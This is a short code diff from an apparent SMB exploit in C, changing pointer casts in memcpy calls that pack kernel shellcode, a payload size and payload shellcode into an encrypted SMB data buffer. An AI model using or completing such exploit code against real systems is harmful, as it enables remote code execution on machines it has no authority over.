@@ -826,13 +826,13 @@ int main(int argc, char* argv[])
 		//hexDump(0, SMBDATA->smbdata, 4096);
 
 		//copy kernel shellcode to encrypted buffer
-		memcpy((unsigned char*)SMBDATA->smbdata, (char*)&kernel_shellcode, kernel_shellcode_size);
+		memcpy((unsigned char*)SMBDATA->smbdata, (unsigned char*)&kernel_shellcode, kernel_shellcode_size);
 
 		//copy the shellcode size after the kernel shellcode
-		memcpy((unsigned char*)SMBDATA->smbdata + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, 2);
+		memcpy((unsigned char*)SMBDATA->smbdata + kernel_shellcode_size, (unsigned char*)&dwPayloadShellcodeSize, 2);
 
 		//copy payload shellcode to encrypted buffer
-		memcpy((unsigned char*)SMBDATA->smbdata + kernel_shellcode_size + 2, (char*)&shellcode, payload_shellcode_size);
+		memcpy((unsigned char*)SMBDATA->smbdata + kernel_shellcode_size + 2, (unsigned char*)&shellcode, payload_shellcode_size);
 
 		memset(SMBDATA->smbdata + EntireShellcodeSize, 0x00, difference);
 		hexDump(0, SMBDATA->smbdata, 4096);
